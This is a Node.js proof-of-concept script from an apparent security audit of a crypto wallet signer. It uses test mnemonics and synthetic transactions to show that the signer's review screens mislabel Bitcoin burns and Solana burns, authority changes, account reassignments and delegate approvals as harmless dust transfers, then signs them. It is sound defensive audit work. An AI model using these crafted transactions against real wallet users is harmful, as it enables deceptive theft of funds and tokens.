/**
 * Security audit reproduction, 2026-10-24.
 * Usage: node engine-current-and-bundle-repro.mjs /absolute/path/to/bitool-signer-android
 * When stored in docs/qa/security-reaudit-2026-10-24-e7e71fb/evidence/, the root argument
 * may be omitted. Requires the repository's installed engine dependencies.
 * Imports CURRENT repository source; it does not use a copied engine snapshot.
 * Only public BIP39 test vectors and synthetic transactions are used.
 * No RPC requests, on-chain broadcasts, file changes, or production secrets.
 * Assertions deliberately confirm the audited vulnerable behavior; they are
 * expected to fail after the respective findings have been fixed.
 */
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { resolve, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { existsSync, readFileSync } from 'node:fs';
import vm from 'node:vm';
import { webcrypto, createHash } from 'node:crypto';
const repoRoot = process.argv[2]
  ? resolve(process.argv[2])
  : fileURLToPath(new URL('../../../../', import.meta.url));
assert.ok(existsSync(join(repoRoot, 'engine/package.json')), 'Pass the repository root as the first argument.');
const requireEngine = createRequire(pathToFileURL(join(repoRoot, 'engine/package.json')));
const source = relative => import(pathToFileURL(join(repoRoot, 'engine', relative)).href);
const dependency = name => import(pathToFileURL(requireEngine.resolve(name)).href);
const [
  { Transaction, p2wpkh },
  { withSeed, withKey, deriveAccounts },
  { derivePublicIndex },
  { resolveSigningPlan, signPlanTask },
  { toBase64, concat, short, utf8, hexToBytes, fromBase64 },
  { parseSolana },
  { parseBitcoin },
  { base58 },
  { sha256 },
  { ed25519 },
] = await Promise.all([
  dependency('@scure/btc-signer'), source('src/keys.js'),
  source('src/public-index.js'), source('src/resolver.js'), source('src/util.js'),
  source('src/solana.js'), source('src/bitcoin.js'), dependency('@scure/base'),
  dependency('@noble/hashes/sha2.js'), dependency('@noble/curves/ed25519.js'),
]);
console.log('Source repository:', repoRoot);
const MN='abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
const PATH="m/84'/0'/0'/0/0";
const me=withSeed(MN,'',(seed,root)=>withKey(seed,root,'bitcoin',PATH,(priv,pub)=>({pub:pub.slice(),fingerprint:root.fingerprint,path:[2147483732,2147483648,2147483648,0,0]})));
const mine=p2wpkh(me.pub), prev=new Transaction();
prev.addInput({txid:new Uint8Array(32),index:0});prev.addOutput({script:mine.script,amount:100000000n});
const t=new Transaction({allowUnknownOutputs:true});
t.addInput({txid:prev.id,index:0,nonWitnessUtxo:prev.unsignedTx,witnessUtxo:{script:mine.script,amount:100000000n},bip32Derivation:[[me.pub,{fingerprint:me.fingerprint,path:me.path}]]});
t.addOutput({script:mine.script,amount:49999000n,bip32Derivation:[[me.pub,{fingerprint:me.fingerprint,path:me.path}]]});
t.addOutput({script:new Uint8Array([0x6a,0x02,0x01,0x02]),amount:50000000n});
const index=derivePublicIndex({mnemonic:MN});
const request={chain:'bitcoin',psbt:toBase64(t.toPSBT()),network:'mainnet'};
const plan=resolveSigningPlan({request,wallets:[{localWalletId:'a',publicIndex:index}]});
assert.equal(plan.status, 'ready');
assert.equal(plan.review.summary, 'Every output returns to your wallet');
assert.equal(plan.review.display.action, 'Burn');
assert.equal(plan.review.display.amount, '0.5');
console.log('BTC',JSON.stringify({status:plan.status,summary:plan.review.summary,display:plan.review.display,warnings:plan.review.warnings}));
const signed=signPlanTask({request,plan,taskId:plan.tasks[0].id,mnemonic:MN,riskAcknowledged:true});
assert.equal(signed.signedInputs, 1);
assert.doesNotThrow(() => parseBitcoin({...request, psbt:signed.psbt}));
console.log('BTC signed inputs',signed.signedInputs);
const SYSTEM='11111111111111111111111111111111', TOKEN='TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA', TM='metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s', SYSVAR='Sysvar1nstructions1111111111111111111111111';
const ME=deriveAccounts({mnemonic:MN}).accounts.find(a=>a.chain==='solana').address;
const k=n=>base58.encode(new Uint8Array(32).fill(n));
const u64=n=>{const b=new Uint8Array(8);new DataView(b.buffer).setBigUint64(0,BigInt(n),true);return b;};
function pda(seeds,program){for(let i=255;i>=0;i--){const h=sha256(concat(...seeds,new Uint8Array([i]),base58.decode(program),utf8('ProgramDerivedAddress')));try{ed25519.Point.fromBytes(h);continue;}catch{return base58.encode(h);}}}
const mint=k(0x33),token=k(0x44),metadata=pda([utf8('metadata'),base58.decode(TM),base58.decode(mint)],TM),edition=pda([utf8('metadata'),base58.decode(TM),base58.decode(mint),utf8('edition')],TM);
function solRequest(ixs){const programs=[...new Set(ixs.map(ix=>ix.p))],keys=[ME];for(const ix of ixs)for(const a of ix.a)if(!keys.includes(a)&&!programs.includes(a))keys.push(a);keys.push(...programs);const at=x=>keys.indexOf(x);return {chain:'solana',kind:'transaction',address:ME,message:toBase64(concat(new Uint8Array([1,0,programs.length]),short(keys.length),...keys.map(x=>base58.decode(x)),new Uint8Array(32).fill(5),short(ixs.length),...ixs.flatMap(ix=>[new Uint8Array([at(ix.p)]),short(ix.a.length),new Uint8Array(ix.a.map(at)),short(ix.d.length),ix.d])))};}
for(const [name,ix] of [['BurnV1',{p:TM,a:[ME,TM,metadata,edition,mint,token,TM,TM,TM,TM,TM,SYSTEM,SYSVAR,TOKEN],d:concat(new Uint8Array([41,0]),u64(1))}],['BurnNft',{p:TM,a:[metadata,ME,mint,token,edition,TOKEN],d:new Uint8Array([29])}]]){const req=solRequest([{p:SYSTEM,a:[ME,k(0x22)],d:concat(new Uint8Array([2,0,0,0]),u64(1))},ix]);const r=parseSolana(req).review;const p=resolveSigningPlan({request:req,wallets:[{localWalletId:'a',publicIndex:index}]});const s=signPlanTask({request:req,plan:p,taskId:p.tasks[0].id,mnemonic:MN,riskAcknowledged:true});assert.equal(r.summary, '0.000000001 SOL');assert.equal(r.display.amount, '0.000000001');assert.equal(r.display.assetContract, undefined);assert.equal(r.riskLevel, 'high');assert.equal(r.decodeStatus, 'partiallyDecoded');assert.ok(ed25519.verify(hexToBytes(s.signature),fromBase64(req.message),base58.decode(ME)));console.log('SOL '+name,JSON.stringify({summary:r.summary,display:r.display,riskLevel:r.riskLevel,decodeStatus:r.decodeStatus,burnWarning:r.warnings.filter(w=>w.includes('destroy')),signed:!!s.signature}));}


// Re-execute through the exact committed Android asset, without rebuilding it.
const bundlePath = join(repoRoot, 'core/engine/src/main/assets/engine/signer.js');
const bundle = readFileSync(bundlePath, 'utf8');
const context = vm.createContext({ crypto: webcrypto });
vm.runInContext(bundle, context, { timeout: 20000 });
assert.equal(vm.runInContext('typeof fetch', context), 'undefined');
const bundled = input => {
  const response = JSON.parse(context.BitToolSignerEngine.dispatch(JSON.stringify(input)));
  assert.equal(response.ok, true, JSON.stringify(response.error));
  return response.result;
};
console.log('Shipped bundle SHA-256:', createHash('sha256').update(bundle).digest('hex'));
const bundleBTCPlan = bundled({ operation:'resolveSigningPlan', request, wallets:[{localWalletId:'a',publicIndex:index}] });
assert.deepEqual(bundleBTCPlan.review, plan.review);
const bundleBTCSignature = bundled({ operation:'signPlanTask', request, plan:bundleBTCPlan, taskId:bundleBTCPlan.tasks[0].id, mnemonic:MN, riskAcknowledged:true });
assert.equal(bundleBTCSignature.signedInputs, 1);
assert.doesNotThrow(() => parseBitcoin({...request, psbt:bundleBTCSignature.psbt}));
console.log('BUNDLED BTC', JSON.stringify({summary:bundleBTCPlan.review.summary,display:bundleBTCPlan.review.display,signatureVerified:true}));
const dust = {p:SYSTEM,a:[ME,k(0x22)],d:concat(new Uint8Array([2,0,0,0]),u64(1))};
const cases = [
 ['BurnV1', {p:TM,a:[ME,TM,metadata,edition,mint,token,TM,TM,TM,TM,TM,SYSTEM,SYSVAR,TOKEN],d:concat(new Uint8Array([41,0]),u64(1))}],
 ['BurnNft', {p:TM,a:[metadata,ME,mint,token,edition,TOKEN],d:new Uint8Array([29])}],
 ['SetAuthority-AccountOwner', {p:TOKEN,a:[token,ME],d:concat(new Uint8Array([6,2,1]),base58.decode(k(0x66)))}],
 ['SetAuthority-RevokeMintAuthority', {p:TOKEN,a:[mint,ME],d:new Uint8Array([6,0,0])}],
 ['System-Assign', {p:SYSTEM,a:[ME],d:concat(new Uint8Array([1,0,0,0]),base58.decode(k(0x67)))}],
 ['Approve-SPLDelegate', {p:TOKEN,a:[token,k(0x66),ME],d:concat(new Uint8Array([4]),u64(1000000000000n))}],
];
for (const [name, ix] of cases) {
  const req = solRequest([dust,ix]);
  const currentReview = parseSolana(req).review;
  const p = bundled({operation:'resolveSigningPlan',request:req,wallets:[{localWalletId:'a',publicIndex:index}]});
  assert.deepEqual(p.review, currentReview);
  assert.equal(p.review.summary, '0.000000001 SOL');
  assert.equal(p.review.display.amount, '0.000000001');
  const s = bundled({operation:'signPlanTask',request:req,plan:p,taskId:p.tasks[0].id,mnemonic:MN,riskAcknowledged:true});
  assert.ok(ed25519.verify(hexToBytes(s.signature),fromBase64(req.message),base58.decode(ME)));
  console.log('BUNDLED SOL '+name, JSON.stringify({summary:p.review.summary,display:p.review.display,riskLevel:p.review.riskLevel,decodeStatus:p.review.decodeStatus,warnings:p.review.warnings,signatureVerified:true}));
}
